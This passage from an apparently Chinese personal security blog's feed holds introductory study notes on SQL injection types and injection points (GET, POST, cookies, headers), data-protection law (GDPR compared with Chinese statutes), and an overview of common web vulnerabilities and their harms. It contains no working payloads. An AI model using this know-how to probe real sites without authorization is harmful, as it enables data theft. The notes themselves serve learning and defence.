字段1=‘条件一’and 字段2 =‘条件二’</li><li>e. 扩展 limitl&emsp;&emsp;(imit m,n 从m行开始，到m+n行结束)<br>select * from admin limit 2,1 指的是 从第二行开始，到第三行结束</li></ul><p>&emsp;</p><p>(还有一些比较杂的内容，没想好怎么更新，晚点再回来写吧)</p>]]></content>
    
    
    <categories>
      
      <category>web</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>SQL注入——类型及提交方法</title>
    <link href="/2022/08/05/SQL%E6%B3%A8%E5%85%A5%E2%80%94%E2%80%94%E7%B1%BB%E5%9E%8B%E5%8F%8A%E6%8F%90%E4%BA%A4%E6%96%B9%E6%B3%95/"/>
    <url>/2022/08/05/SQL%E6%B3%A8%E5%85%A5%E2%80%94%E2%80%94%E7%B1%BB%E5%9E%8B%E5%8F%8A%E6%8F%90%E4%BA%A4%E6%96%B9%E6%B3%95/</url>
    
    <content type="html"><![CDATA[<h1 id="SQL注入——类型及提交方法"><a href="#SQL注入——类型及提交方法" class="headerlink" title="SQL注入——类型及提交方法"></a>SQL注入——类型及提交方法</h1><h4 id="1-前言"><a href="#1-前言" class="headerlink" title="1.前言"></a>1.前言</h4><p>&emsp;&emsp;在现实的SQL注入安全测试中，我们首先要明确提交数据及提交方法后再进行相关的注入，其中提交数据类型和提交方法可以通过抓包分析获取，后续的安全测试中我们也必须满足同等的操作才能进行注入。</p><center><img src="/img/SQL%E6%B3%A8%E5%85%A5%E2%80%94%E2%80%94%E7%B1%BB%E5%9E%8B%E5%8F%8A%E6%8F%90%E4%BA%A4%E6%96%B9%E6%B3%95/1.png" style="zoom:67%;" /></center><p>&emsp;</p><h4 id="2-数据类型"><a href="#2-数据类型" class="headerlink" title="2.数据类型"></a>2.数据类型</h4><ul><li>数字型语句：</li></ul><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-keyword">select</span> <span class="hljs-operator">*</span> <span class="hljs-keyword">from</span> <span class="hljs-keyword">user</span> <span class="hljs-keyword">where</span> id  <br></code></pre></td></tr></table></figure><ul><li>字符型语句：</li></ul><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-keyword">select</span> <span class="hljs-operator">*</span> <span class="hljs-keyword">from</span> <span class="hljs-keyword">user</span> <span class="hljs-keyword">where</span> name <span class="hljs-operator">=</span> <span class="hljs-string">&#x27;liaoyue&#x27;</span><br></code></pre></td></tr></table></figure><ul><li>搜索型语句：（like）</li></ul><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-keyword">select</span> <span class="hljs-operator">*</span> <span class="hljs-keyword">from</span> users <span class="hljs-keyword">where</span> name <span class="hljs-keyword">like</span> ‘<span class="hljs-operator">%</span>liaoyue<span class="hljs-operator">%</span>’<br><span class="hljs-keyword">select</span> <span class="hljs-operator">*</span> <span class="hljs-keyword">from</span> users <span class="hljs-keyword">where</span> name <span class="hljs-keyword">like</span>  (’<span class="hljs-operator">%</span>xihua<span class="hljs-operator">%</span>’)<br></code></pre></td></tr></table></figure><p>&emsp;&emsp;通过三种语句的对比可以看见，在字符型语句中变量是需要使用到引号的，而在搜索类型中则需要注释单引号’、百分号%、括号等，这个需要自己进行多次尝试，搜索语句的类型并不多。因此我们的参数值在注入的时候需要去注意类型的判别。</p><p>&emsp;&emsp;json类型：</p><h4 id="3-请求方法"><a href="#3-请求方法" class="headerlink" title="3.请求方法"></a>3.请求方法</h4><p>&emsp;&emsp;不同的请求方式，上传的数据类型和大小是有区别的。我们不在上传的时候要根据请求的发送进行提交相关的语句，因此同的请求方法可能会有着不同注入的写法和方式。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-variable">$get</span>=<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;g&#x27;</span>];       <span class="hljs-comment">//get接受参数名为g的值赋值给变量get</span><br><span class="hljs-keyword">echo</span> <span class="hljs-variable">$get</span>;             <span class="hljs-comment">//输出变量g的数据</span><br><br><span class="hljs-variable">$post</span>=<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;p&#x27;</span>];     <span class="hljs-comment">//post接受参数名为p的值赋值给变量post</span><br><span class="hljs-keyword">echo</span> <span class="hljs-variable">$post</span>;            <span class="hljs-comment">//输出变量p的数据</span><br><br><span class="hljs-variable">$c</span>=<span class="hljs-variable">$_COOKIE</span>[<span class="hljs-string">&#x27;c&#x27;</span>];<br><span class="hljs-keyword">echo</span> <span class="hljs-variable">$c</span>;<br><br><span class="hljs-variable">$r</span>=<span class="hljs-variable">$_REQUEST</span>[<span class="hljs-string">&#x27;r&#x27;</span>];<br><span class="hljs-keyword">echo</span> <span class="hljs-variable">$r</span>;<br> <br><span class="hljs-variable">$s</span>=<span class="hljs-variable">$_SERVER</span>[<span class="hljs-string">&#x27;HTTP_USER_AGENT&#x27;</span>];<br><span class="hljs-keyword">echo</span> <span class="hljs-variable">$s</span>;<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>&emsp;&emsp;（注：在java、python等语言的框架中基本也是一样的思路，只是写法可能会有细微的出入）</p><ul><li><h5 id="GET与POST："><a href="#GET与POST：" class="headerlink" title="GET与POST："></a>GET与POST：</h5></li></ul><p>&emsp;&emsp;我们尝试发送数据<a href="http://127.0.0.1/liaoyue.php/?g=123&amp;p=456">http://127.0.0.1/liaoyue.php/?g=123&amp;p=456</a></p><center><img src="/img/SQL%E6%B3%A8%E5%85%A5%E2%80%94%E2%80%94%E7%B1%BB%E5%9E%8B%E5%8F%8A%E6%8F%90%E4%BA%A4%E6%96%B9%E6%B3%95/2.jpg" style="zoom:67%;" /></center><center><img src="/img/SQL%E6%B3%A8%E5%85%A5%E2%80%94%E2%80%94%E7%B1%BB%E5%9E%8B%E5%8F%8A%E6%8F%90%E4%BA%A4%E6%96%B9%E6%B3%95/3.jpg" alt="3" style="zoom: 67%;" /></center>&emsp;&emsp;可以看见，在数据包传输过后，界面显示的只有g的内容，p的内容传送失败了。这是因为在burp的抓包中，我们的数据是用GET的形式去请求的，而p是用POST进行接收，所以p并没有接收最终导致了只有g的内容被打印出来。<p>&emsp;&emsp;接下来修改传送方法，通过火狐插件 HackBar 在post提交p。</p><center><img src="/img/SQL%E6%B3%A8%E5%85%A5%E2%80%94%E2%80%94%E7%B1%BB%E5%9E%8B%E5%8F%8A%E6%8F%90%E4%BA%A4%E6%96%B9%E6%B3%95/6.jpg" style="zoom:67%;" /></center><center><img src="/img/SQL%E6%B3%A8%E5%85%A5%E2%80%94%E2%80%94%E7%B1%BB%E5%9E%8B%E5%8F%8A%E6%8F%90%E4%BA%A4%E6%96%B9%E6%B3%95/4.jpg" style="zoom:80%;" /></center><p>&emsp;&emsp;最终效果：</p><center><img src="/img/SQL%E6%B3%A8%E5%85%A5%E2%80%94%E2%80%94%E7%B1%BB%E5%9E%8B%E5%8F%8A%E6%8F%90%E4%BA%A4%E6%96%B9%E6%B3%95/5.jpg" style="zoom: 67%;" /></center>&emsp;&emsp;成功显示123456，在网址后面传参为get请求，不论是否为POST的请求类型，主要是在网址后面，get就能接收到，所以这样子用了POST的请求方式可以同时把GET和POST两个参数都传上去。<center><img src="/img/SQL%E6%B3%A8%E5%85%A5%E2%80%94%E2%80%94%E7%B1%BB%E5%9E%8B%E5%8F%8A%E6%8F%90%E4%BA%A4%E6%96%B9%E6%B3%95/6.jpg" style="zoom: 60%;" /></center><p>&emsp;&emsp;这也就是说我们注入的位置是有要求和限制的，不同的请求方式会导致我们注入位置形成影响</p><ul><li><h5 id="COOKIE"><a href="#COOKIE" class="headerlink" title="COOKIE"></a>COOKIE</h5></li></ul><p>&emsp;&emsp;首先明确cookie并不是请求方法，是在数据包中cookie可以通过修改数据包中的cookie进行注入</p><center><img src="/img/SQL%E6%B3%A8%E5%85%A5%E2%80%94%E2%80%94%E7%B1%BB%E5%9E%8B%E5%8F%8A%E6%8F%90%E4%BA%A4%E6%96%B9%E6%B3%95/7.jpg" style="zoom: 100%;" /></center><ul><li><h5 id="REQUEST"><a href="#REQUEST" class="headerlink" title="REQUEST"></a>REQUEST</h5></li></ul><p>&emsp;&emsp;既可以通过GET请求，也可以通过POST请求，基本可以说可以REQUST能在所有方法的位置提交。</p><center><img src="/img/SQL%E6%B3%A8%E5%85%A5%E2%80%94%E2%80%94%E7%B1%BB%E5%9E%8B%E5%8F%8A%E6%8F%90%E4%BA%A4%E6%96%B9%E6%B3%95/8.jpg" style="zoom: 100%;" /></center><p>&emsp;&emsp;当然，在post请求的方法中也只是将位置接在post传输的数据后面，其他没有区别。</p><ul><li><h5 id="HTTP-头"><a href="#HTTP-头" class="headerlink" title="HTTP 头"></a>HTTP 头</h5></li></ul><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-comment">#$_SERVER详解</span><br><span class="hljs-variable">$_SERVER</span>[<span class="hljs-string">&#x27;HTTP_ACCEPT_LANGUAGE&#x27;</span>]       <span class="hljs-comment">//浏览器语言 </span><br><span class="hljs-variable">$_SERVER</span>[<span class="hljs-string">&#x27;REMOTE_ADDR&#x27;</span>]               <span class="hljs-comment">//当前用户 IP</span><br><span class="hljs-comment">#其余的相关内容可以参考网站：https://www.cainiaoxueyuan.com/bc/9910.html</span><br></code></pre></td></tr></table></figure><p>&emsp;&emsp;测试网址：<a href="http://ip.tool.chinaz.com/">http://ip.tool.chinaz.com/</a></p><center><img src="/img/SQL%E6%B3%A8%E5%85%A5%E2%80%94%E2%80%94%E7%B1%BB%E5%9E%8B%E5%8F%8A%E6%8F%90%E4%BA%A4%E6%96%B9%E6%B3%95/9.jpg" style="zoom: 100%;" /></center><center><img src="/img/SQL%E6%B3%A8%E5%85%A5%E2%80%94%E2%80%94%E7%B1%BB%E5%9E%8B%E5%8F%8A%E6%8F%90%E4%BA%A4%E6%96%B9%E6%B3%95/10.jpg" style="zoom: 100%;" /></center>]]></content>
    
    
    <categories>
      
      <category>web</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>SQL注入基础知识</title>
    <link href="/2022/08/04/SQL%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86/"/>
    <url>/2022/08/04/SQL%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86/</url>
    
    <content type="html"><![CDATA[<h1 id="SQL注入基础知识"><a href="#SQL注入基础知识" class="headerlink" title="SQL注入基础知识"></a>SQL注入基础知识</h1><h4 id="1-SQL的简介"><a href="#1-SQL的简介" class="headerlink" title="1.SQL的简介"></a>1.SQL的简介</h4><p>&emsp;&emsp;SQL (结构化查询语言) 是用于管理关系数据库管理系统（RDBMS）。 SQL 的范围包括数据插入、查询、更新和删除，数据库模式创建和修改，以及数据访问控制。</p><p>&emsp;&emsp;虽然存在着不同版本的SQL语言，但是为了ANSI标准的兼容性，它们必须以相似的方式来支持一些主要的命令（SELECT、UPDATE、DELETE、INSERT、WHERE 等等），当然除了这些标准外，大部分SQL数据库都拥有它们自己的专有扩展。</p><p>&emsp;</p><h4 id="2-SQL注入的定义"><a href="#2-SQL注入的定义" class="headerlink" title="2.SQL注入的定义"></a>2.SQL注入的定义</h4><p>&emsp;&emsp;SQL 注入是一种非常常见的数据库攻击手段，是一种通过操作输入来修改后台SQL语句达到代码执行进行攻击目的的技术。</p><p>&emsp;</p><h4 id="3-SQL注入的原理"><a href="#3-SQL注入的原理" class="headerlink" title="3.SQL注入的原理"></a>3.SQL注入的原理</h4><p>&emsp;&emsp;web应用程序对用户输入数据的合法性没有判断或过滤不严，攻击者可以在web应用程序中事先定义好的查询语句的结尾上添加额外的SQL语句]，在管理员不知情的情况下实现非法操作，以此来实现欺骗数据库服务器执行非授权的任意查询，从而进一步得到相应的数据信息。</p><p>&emsp;&emsp;（简单来说就是利用查库的变量伪造出数据库的语句进行增删改查的操作，一般查的实现比较多，所以能够泄漏得到数据库的信息）</p><center><img src="/img/SQL%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86/1-16602818120541.png" style="zoom:100%;" /></center><p>&emsp;</p><h4 id="4-SQL注入的种类"><a href="#4-SQL注入的种类" class="headerlink" title="4.SQL注入的种类"></a>4.SQL注入的种类</h4><ol><li>注入手法分类：<ul><li>联合查询注入</li><li>报错型注入</li><li>布尔型注入</li><li>延时注入</li><li>堆叠注入</li></ul></li><li>数据类型分类：<ul><li>字符型</li><li>数值型</li></ul></li><li>注入位置分类：<ul><li>GET数据（地址栏）</li><li>POST数据（输入框）</li><li>HTTP头部</li><li>Cookie数据</li></ul></li></ol><p>&emsp;</p><h4 id="5-SQL注入的危害"><a href="#5-SQL注入的危害" class="headerlink" title="5.SQL注入的危害"></a>5.SQL注入的危害</h4><ol><li>访问数据库数据，盗取信息</li><li>对数据库进行增删改查</li><li>如果网站目录存在写入权限，可以写入网页木马</li><li>提权</li><li>等等</li></ol><p>&emsp;</p>]]></content>
    
    
    <categories>
      
      <category>web</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>数据安全技术前沿研究笔记（一）</title>
    <link href="/2022/08/04/%E6%95%B0%E6%8D%AE%E5%AE%89%E5%85%A8%E6%97%A5%E8%AE%B0%E4%BA%94/"/>
    <url>/2022/08/04/%E6%95%B0%E6%8D%AE%E5%AE%89%E5%85%A8%E6%97%A5%E8%AE%B0%E4%BA%94/</url>
    
    <content type="html"><![CDATA[<h1 id="数据安全技术前沿研究笔记（一）"><a href="#数据安全技术前沿研究笔记（一）" class="headerlink" title="数据安全技术前沿研究笔记（一）"></a>数据安全技术前沿研究笔记（一）</h1><h4 id="1-前言"><a href="#1-前言" class="headerlink" title="1.前言"></a>1.前言</h4><p>&emsp;&emsp;最近在看绿盟出的《拥抱合规、超越合规：数据安全技术前沿研究报告》，书是本好书，接下来也会分享自己的阅读笔记，但是这个名字又臭又长是谁想出来的。对于后续的技术学习其实我心里也没什么底，毕竟差分计算，联邦学习有接触过，感觉挺难的，冲！</p><p>&emsp;</p><h4 id="2-为什么要关注数据安全"><a href="#2-为什么要关注数据安全" class="headerlink" title="2.为什么要关注数据安全"></a>2.为什么要关注数据安全</h4><p>&emsp;&emsp;现在随着时代的发展，在大数据时代，数据的作用和重要性越来越大，数据的国家战略性资源地位也被确立。但是近年来，大规模的数据泄露事件频频发生。”大数据杀熟“、数据歧视、个人信息非法采集和窃取等现象发生得越来越多。因此，为了应对这种挑战，全国掀起了数据安全与隐私的立法和技术热潮。（可以看数据安全的第一篇文章，里面就摘抄出了很多不同国家不同机构出台的数据安全法律法规）</p><p>&emsp;&emsp;随着安全的重视，许多国家陆陆续续的出台了比较具有代表性的法案。欧盟的《通用数据保护条例》（GDPR）、美国的《加州消费者隐私法案》（CCPA）以及我国基于总体国家安全观指导下的《数据安全法》和对公民隐私和个人信息进行安全保护的《个人信息保护法》。</p><p>&emsp;</p><h4 id="3-为什么要先关注数据安全的法律"><a href="#3-为什么要先关注数据安全的法律" class="headerlink" title="3.为什么要先关注数据安全的法律"></a>3.为什么要先关注数据安全的法律</h4><p>&emsp;&emsp;全国数据安全法规的监管在不断的完善，这就涉及到了一个合规性的问题，企业的建设是否符合要求，重要的数据是否得到保护，这都是我们需要研究的的问题。在绿盟的这本书中，主要是针对用户隐私数据安全合规、企业内部数据安全治理和企业间数据安全共享与计算进行合规需求的梳理分析，同时选取了十周种比较前言的数据安全技术手段进行讲解好分析（一开始粗略瞅了一眼，看得头皮发麻）</p><p>&emsp;&emsp;其实，一开始给自己的定位是作为一个追求技术操作，但是如果没有法律法规的铺垫和研究，我们没办法明白我们最终技术所要实现的目标和作用，所以阅读法律法规是比较有必要的事情。</p><p>&emsp;</p><h4 id="4-国内外立法与执法趋势"><a href="#4-国内外立法与执法趋势" class="headerlink" title="4.国内外立法与执法趋势"></a>4.国内外立法与执法趋势</h4><h6 id="国外："><a href="#国外：" class="headerlink" title="国外："></a>国外：</h6><p>&emsp;&emsp;在立法方面，比较有代表性的就算欧盟2018年5月25日实施的《通用数据保护条例》（GDPR），在该条例的影响下，其他国家也陆陆续续推出了各自相关的法案。</p><p>&emsp;&emsp;在执法方面，欧盟由于立法比较早，所以相较于其他国家而言，欧盟已经进入到了全面执法的阶段并开出了违反GDPR的相关罚单（比如英国航空公司的1.83亿英镑和万豪国际集团的9900万英镑）。</p><h6 id="国内："><a href="#国内：" class="headerlink" title="国内："></a>国内：</h6><p>&emsp;&emsp;在立法方面，从2017年的《网络安全法》、2020的《民法典》到2021年的《数据安全法》等等，越来越多关注数据安全的法律规出台。这也表明了我国对数据安全的高度重视。</p><p>&emsp;&emsp;在执法方面，我国监管部门重视的方面主要有两个，一个是针对APP个人信息授权专项治理（滴滴事件等），一个是针对个人信息非法交易与黑灰产的整治。（净网行动）</p><p>&emsp;</p><h4 id="5-数据安全合规热点与解读"><a href="#5-数据安全合规热点与解读" class="headerlink" title="5.数据安全合规热点与解读"></a>5.数据安全合规热点与解读</h4><p>&emsp;</p><h6 id="emsp-0）前言"><a href="#emsp-0）前言" class="headerlink" title="&emsp;0）前言"></a>&emsp;0）前言</h6><p>&emsp;&emsp;&emsp;由于欧盟的《GDPR》出台具有很大的代表性，所以绿盟的报告才将该法作为典型与我国的法律进行比较，获得共同点和差异处（个人理解）</p><p>&emsp;</p><h6 id="emsp-1）保护对象："><a href="#emsp-1）保护对象：" class="headerlink" title="&emsp;1）保护对象："></a>&emsp;1）保护对象：</h6><p>&emsp;&emsp;&emsp;《GDPR》保护对象是公民的“个人数据”，值得一提的是其对个人数据的定义是比较广泛的。涵盖信息十分丰富，包括了指纹、虹膜和DNA数据等特殊的数据。</p><p>&emsp;&emsp;&emsp;《网络安全法》明确了保护的重点数据对象是“个人信息”。相比 GDPR来说，我国罗列的个人信息范畴并不大，并不包括由个人关联的信息（比如用户的行为 / 习惯等识别性不高的信息），这在一定程度缩小了“个人信息”的范围，降低敏感信息分类分级及保护的成本。当然，在个人信息保护法中有了更加宽泛定义的倾向。</p><p>&emsp;</p><h6 id="emsp-2）用户的数据权利："><a href="#emsp-2）用户的数据权利：" class="headerlink" title="&emsp;2）用户的数据权利："></a>&emsp;2）用户的数据权利：</h6><p>&emsp;&emsp;&emsp;《GDPR》赋予了“数据主体”（或称用户）知情权、访问权、修改权、限制处理权、<br>删除权（也称“被遗忘权”）、可携带权、拒绝权等多项权利。 “被遗忘权”和“可携带权”是 GDPR新增两项用户“特权”。</p><p>&emsp;&emsp;&emsp;《网络安全法》赋予了用户一定程度的“删除权”和“修改权”，而在《个人信息保护法》中则赋予了用户更丰富更具体的数据权利（知情权、访问权、被解释权等）</p><p>&emsp;</p><h6 id="emsp-3）企业的安全义务"><a href="#emsp-3）企业的安全义务" class="headerlink" title="&emsp;3）企业的安全义务"></a>&emsp;3）企业的安全义务</h6><p>&emsp;&emsp;&emsp;《GDPR》规定了企业必须响应和履行卫用户行使权利提供方便的义务，另外还要求了企业必须保存数据处理活动的记录和针对数据的安全措施</p><p>&emsp;&emsp;&emsp;在我国法律中同样要求企业要配合用户行使数据的权利，此外，企业在防止数据泄露、窃取篡改等数据安全事件上，需履行安全管理制度、组织和规范建设，落实有效的网络安全措施。</p><p>&emsp;&emsp;&emsp;确实对企业的要求不管是哪个国家都要求的差不多，在满足用户数据使用权利的前提下，保障用户数据的安全性。</p><p>&emsp;</p><h6 id="emsp-4）违法违规的处罚"><a href="#emsp-4）违法违规的处罚" class="headerlink" title="&emsp;4）违法违规的处罚"></a>&emsp;4）违法违规的处罚</h6><p>&emsp;&emsp;&emsp;《GDPR》可被处以最高 2000 万欧元的行政罚款，或对企业以最高占上一财政年度全球总营业额 4% 的行政罚款，取两者最高值。违反数据处理规定被处罚的代价是十分高昂的（贵的一批）</p><p>&emsp;&emsp;&emsp;我国的《网络安全法》中最高可处罚 100 万元的罚款，对直接负责的主管人员处罚最高 10 万元罚款。除罚款以外，还有责令暂停相关业务、关闭网站、吊销营业执照等严厉的行政处罚措施。在最近发布《个人信息保护法》中，对于个人信息的违法犯罪加大了处罚与罚款力度，对于违法情节严重的最高可以处罚 5000 万元以下或者上一年度营业额 5% 罚款，同时对直接负责的主管人员最高可罚款 100万元（看滴滴就知道了）</p><p>&emsp;</p><h6 id="emsp-5）小结"><a href="#emsp-5）小结" class="headerlink" title="&emsp;5）小结"></a>&emsp;5）小结</h6><p>&emsp;&emsp;&emsp;法律越来越完善，对于很多定义和行为也有了清楚的讲解，处罚也会越来越重视</p>]]></content>
    
    
    <categories>
      
      <category>五所实习之数据安全</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>web漏洞类型</title>
    <link href="/2022/08/03/web%E6%BC%8F%E6%B4%9E%E7%B1%BB%E5%9E%8B/"/>
    <url>/2022/08/03/web%E6%BC%8F%E6%B4%9E%E7%B1%BB%E5%9E%8B/</url>
    
    <content type="html"><![CDATA[<h1 id="web漏洞类型"><a href="#web漏洞类型" class="headerlink" title="web漏洞类型"></a>web漏洞类型</h1><h4 id="1、漏洞类型导图"><a href="#1、漏洞类型导图" class="headerlink" title="1、漏洞类型导图"></a>1、漏洞类型导图</h4><h4 id=""><a href="#" class="headerlink" title=""></a><img src="/img/web%E6%BC%8F%E6%B4%9E%E7%B1%BB%E5%9E%8B/1-16585448959291.png" style="zoom:67%;" /></h4><h4 id="2、漏洞等级划分"><a href="#2、漏洞等级划分" class="headerlink" title="2、漏洞等级划分"></a>2、漏洞等级划分</h4><p>&emsp;&emsp;漏洞等级取决于漏洞的危害程度，所以越威胁的漏洞，等级越高</p><p>&emsp;&emsp;（感觉自己说的是个屁，不确定，再闻闻）</p><h5 id="emsp-emsp-高危漏洞："><a href="#emsp-emsp-高危漏洞：" class="headerlink" title="&emsp;&emsp;高危漏洞："></a>&emsp;&emsp;高危漏洞：</h5><ul><li>SQL注入</li><li>文件上传</li><li>代码执行</li><li>未授权访问</li><li>命令执行</li></ul><h5 id="emsp-emsp-中危漏洞："><a href="#emsp-emsp-中危漏洞：" class="headerlink" title="&emsp;&emsp;中危漏洞："></a>&emsp;&emsp;中危漏洞：</h5><ul><li>反序列化</li><li>逻辑安全</li></ul><h5 id="emsp-emsp-低危漏洞："><a href="#emsp-emsp-低危漏洞：" class="headerlink" title="&emsp;&emsp;低危漏洞："></a>&emsp;&emsp;低危漏洞：</h5><ul><li>XXS攻击</li><li>目录遍历</li><li>文件读取</li></ul><h4 id="3、漏洞的简单介绍"><a href="#3、漏洞的简单介绍" class="headerlink" title="3、漏洞的简单介绍"></a>3、漏洞的简单介绍</h4><p>&emsp;&emsp;简单介绍下各个漏洞混个脸熟先，搞技术没有操作过程进行讲解就是耍流氓，后续会通过题目讲解</p><h5 id="1）SQL注入"><a href="#1）SQL注入" class="headerlink" title="1）SQL注入"></a>1）SQL注入</h5><p>&emsp;&emsp;SQL 注入是一种非常常见的数据库攻击手段，SQL 注入漏洞也是网络世界中最普遍的漏洞 之一。是指web应用程序对用户输入数据的合法性没有判断或过滤不严，攻击者可以在web应用程序中事先定义好的查询语句的结尾上添加额外的SQL语句]，在管理员不知情的情况下实现非法操作，以此来实现欺骗数据库服务器执行非授权的任意查询，从而进一步得到相应的数据信息。</p><p>&emsp;&emsp;（简单来说就是利用查库的变量伪造出数据库的语句进行增删改查的操作，一般查的实现比较多，所以能够泄漏得到数据库的信息）</p><p>&emsp;&emsp;危害：</p><ul><li>访问数据库数据，盗取信息</li><li>对数据库进行增删改查</li><li>如果网站目录存在写入权限，可以写入网页木马</li><li>提权</li><li>等等</li></ul><p>&emsp;</p><h5 id="2）文件上传"><a href="#2）文件上传" class="headerlink" title="2）文件上传"></a>2）文件上传</h5><p>&emsp;&emsp;文件上传是大部分Web应用都具备的功能，例如用户上传附件、修改头像、分享图片/视频等。正常的文件一般是文档、图片、视频等，Web应用收集之后放入后台存储，需要的时候再调用出来返回。</p><p>&emsp;&emsp;如果恶意文件如PHP、ASP等执行文件绕过Web应用，并顺利执行，则相当于黑客直接拿到了Webshell，则可以拿到Web应用的数据，删除Web文件，本地提权，进一步拿下整个服务器甚至内网。</p><p>&emsp;&emsp;危害：</p><ul><li>上传webshell，控制服务器，远程命令执行</li><li>上传系统百度、木马文件、构造僵尸网络</li><li>修改web界面</li><li>网络挂马和钓鱼</li><li>内网渗透</li><li>等等</li></ul><p>&emsp;</p><h5 id="3）XSS攻击（跨站脚本攻击）"><a href="#3）XSS攻击（跨站脚本攻击）" class="headerlink" title="3）XSS攻击（跨站脚本攻击）"></a>3）XSS攻击（跨站脚本攻击）</h5><p>&emsp;&emsp;XSS通常指的是通过利用网页开发时留下的漏洞，通过巧妙的方法注入恶意指令代码到网页，使用户加载并执行攻击者恶意制造的网页程序。这些恶意网页程序通常是JavaScript，但实际上也可以包括Java，VBScript，ActiveX，Flash或者甚至是普通的HTML。</p><p>&emsp;&emsp;（简单来讲，就是在输入的地方，将输入的值变成恶意指令代码，让后台去执行，我一直觉得其实和SQL差不多的想法，只是面向对象和实现的语言不同）</p><p>&emsp;&emsp;危害：</p><ul><li>窃取Cookie</li><li>未授权操作</li><li>网络挂马和钓鱼</li><li>植入广告和垃圾信息</li><li>等等</li></ul><p>&emsp;</p><h5 id="4）文件包含"><a href="#4）文件包含" class="headerlink" title="4）文件包含"></a>4）文件包含</h5><p>&emsp;&emsp;文件包含漏洞主要是程序员把一些公用的代码写在一个单独的文件中，然后使用其他文件进行包含调用，如果需要包含的文件使用硬编码，一般是不会出现安全问题，但是有时可能不确定需要包含哪些具体文件，所以就会采用变量的形式来传递需要包含的文件，但是在使用包含文件的过程中，未对包含的变量进行检查及过滤，导致外部提交的恶意数据作为变量进入到了文件包含的过程中，从而导致提交的恶意数据被执行。</p><p>&emsp;&emsp;（单纯的描述其实有点绕，还是后续实践来讲清楚吧）</p><p>&emsp;&emsp;危害：</p><ul><li>web服务器的文件信息泄露</li><li>脚本被执行（篡改网站、非法操作、攻击其他网站等）</li><li>等等</li></ul><p>&emsp;</p><h5 id="5）反序列化"><a href="#5）反序列化" class="headerlink" title="5）反序列化"></a>5）反序列化</h5><p>&emsp;&emsp;序列化就是把对象转换成一种数据格式，如Json、XML等文本格式或二进制字节流格式，便于保存在内存、文件、数据库中或者在网络通信中进行传输。反序列化是序列化的逆过程，即由保存的文本格式或字节流格式还原成对象。</p><p>&emsp;&emsp;很多编程语言都提供了这一功能，但不幸的是，如果应用代码允许接受不可信的序列化数据，在进行反序列化操作时，可能会产生反序列化漏洞，远程攻击者利用漏洞可在未经任何身份验证的服务器主机上执行任意代码，被攻击者间接控制服务器</p><p>&emsp;&emsp;危害：</p><ul><li>拒绝服务</li><li>访问控制</li><li>远程命令执行</li><li>等等</li></ul><p>&emsp;</p><h5 id="6）代码执行"><a href="#6）代码执行" class="headerlink" title="6）代码执行"></a>6）代码执行</h5><p>&emsp;&emsp;由于服务器端没有针对执行函数做过滤，导致在没有指定绝对路径的情况下就执行命令，可能会允许攻击者通过改变 $PATH 或程序执行环境的其他方面来执行一个恶意构造的代码。造成代码执行相关的函数分别是：eval、assert函数</p><p>&emsp;&emsp;危害：</p><ul><li>泄露服务器信息</li><li>木马植入</li><li>敏感文件暴露</li><li>远程命令执行</li><li>等等</li></ul><p>&emsp;</p><h5 id="7）逻辑漏洞"><a href="#7）逻辑漏洞" class="headerlink" title="7）逻辑漏洞"></a>7）逻辑漏洞</h5><p>&emsp;&emsp;逻辑漏洞就是指攻击者利用业务的设计缺陷，获取敏感信息或破坏业务的完整性。一般出现在密码修改、越权访问、密码找回、交易支付金额等功能处。其中越权访问又有水平越权和垂直越权两种。</p><p>&emsp;&emsp;危害：</p><ul><li>修改前端代码（比如改订单的金额）</li><li>密码修改或找回</li><li>等等（类型比较多）</li></ul><p>&emsp;</p><h5 id="8）未授权访问"><a href="#8）未授权访问" class="headerlink" title="8）未授权访问"></a>8）未授权访问</h5><p>&emsp;&emsp;未授权访问，顾名思义不进行请求授权的情况下对需要权限的功能进行访问执行。通常是由于认证页面存在缺陷，无认证，安全配置不当导致。常见于服务端口，接口无限制开放，网页功能通过链接无限制用户访问，低权限用户越权访问高权限功能。所以是系统对用户限制不全，或者无限制，可以让任意用户或者限制访问用户。</p><p>&emsp;&emsp;危害：</p><ul><li>信息泄露</li><li>系统功能执行</li><li>等等</li></ul><p>&emsp;</p><h5 id="9）CSRF攻击（跨站点请求伪造）"><a href="#9）CSRF攻击（跨站点请求伪造）" class="headerlink" title="9）CSRF攻击（跨站点请求伪造）"></a>9）CSRF攻击（跨站点请求伪造）</h5><p>&emsp;&emsp;攻击者通过伪造用户的浏览器的请求，向访问一个用户自己曾经认证访问过的网站发送出去，使目标网站接收并误以为是用户的真实操作而去执行命令。攻击者利用网站对请求的验证漏洞而实现这样的攻击行为，网站能够确认请求来源于用户的浏览器，却不能验证请求是否源于用户的真实意愿下的操作行为。</p><p>&emsp;&emsp;（就是伪造成别人，拿着别人的认证信息混过网站的验证）</p><p>&emsp;&emsp;危害：</p><ul><li>盗取账号</li><li>转账</li><li>发送虚假消息</li><li>等等</li></ul><p>&emsp;</p><h5 